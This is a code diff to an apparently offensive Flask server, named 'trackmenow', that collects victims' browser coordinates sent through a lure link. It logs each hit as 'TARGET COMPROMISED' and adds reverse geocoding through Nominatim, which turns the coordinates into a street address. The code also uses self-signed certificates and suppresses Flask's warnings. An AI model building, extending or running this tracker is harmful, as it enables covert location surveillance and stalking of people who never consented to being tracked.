@@ -2,6 +2,7 @@ import os
 import sys
 import subprocess
 from flask import Flask, render_template, request, jsonify
+from geopy.geocoders import Nominatim  # ঠিকানা বের করার লাইব্রেরি
 
 app = Flask(__name__)
 
@@ -13,8 +14,10 @@ YELLOW = '\033[93m'
 BOLD = '\033[1m'
 RESET = '\033[0m'
 
+# Initialize the Geolocator with a custom user-agent
+geolocator = Nominatim(user_agent="trackmenow_osint")
+
 def show_banner():
-    # Only clear the terminal screen during the core application activation sequence
     if os.environ.get('WERKZEUG_RUN_MAIN') == 'true':
         os.system('clear' if os.name != 'nt' else 'cls')
     
@@ -47,10 +50,18 @@ def update_location():
         latitude = data.get('lat')
         longitude = data.get('lon')
         
-        # Live target telemetry logging
+        # 🎯 Reverse Geocoding: ল্যাটিচিউড থেকে আসল ঠিকানা বের করা
+        try:
+            location_details = geolocator.reverse(f"{latitude}, {longitude}", timeout=10)
+            address = location_details.address if location_details else "Unknown Location Address"
+        except Exception:
+            address = "Failed to resolve address (Network Timeout)"
+        
+        # Live target telemetry logging (Now with Full Address Location)
         print(f"\n{GREEN}{BOLD}[🎯] TARGET COMPROMISED - NEW LOCATION CAPTURED!{RESET}")
         print(f"    {CYAN}LATITUDE  :{RESET} {YELLOW}{latitude}{RESET}")
         print(f"    {CYAN}LONGITUDE :{RESET} {YELLOW}{longitude}{RESET}")
+        print(f"    {CYAN}ADDRESS   :{RESET} {GREEN}{BOLD}{address}{RESET}")  # এখানে আসল ঠিকানা দেখাবে
         print(f"    {CYAN}STATUS    :{RESET} {GREEN}Data successfully intercepted & parsed.{RESET}\n")
         
         return jsonify({"status": "success", "message": "Location updated"}), 200
@@ -60,18 +71,15 @@ def update_location():
         return jsonify({"status": "error", "message": str(e)}), 500
 
 if __name__ == '__main__':
-    # 1. Self-healing block for handling missing certificates
     cert_path = 'cert.pem'
     key_path = 'key.pem'
     if not (os.path.exists(cert_path) and os.path.exists(key_path)):
         if os.path.exists('generate_cert.sh'):
             subprocess.run(['bash', 'generate_cert.sh'])
 
-    # 2. Trigger the framework display
     show_banner()
     
     if os.path.exists(cert_path) and os.path.exists(key_path):
-        # 3. Print the persistent link target panel right underneath the header banner
         print(f"{CYAN}[*] Initializing SSL/TLS layer with self-signed certificates...{RESET}")
         print(f"{GREEN}[+] Framework status: ACTIVE and listening for incoming payloads...{RESET}")
         
@@ -81,7 +89,6 @@ if __name__ == '__main__':
         print(f"{GREEN}{BOLD}======================================={RESET}")
         print(f"{CYAN}[*] Awaiting target interaction. Live logs will stream below...{RESET}\n")
         
-        # Fully suppress the standard development warning headers to maintain UI consistency
         import flask.cli
         flask.cli.show_server_banner = lambda *x: None 
         
@@ -91,4 +98,3 @@ if __name__ == '__main__':
             debug=True, 
             ssl_context=(cert_path, key_path)
         )
-        
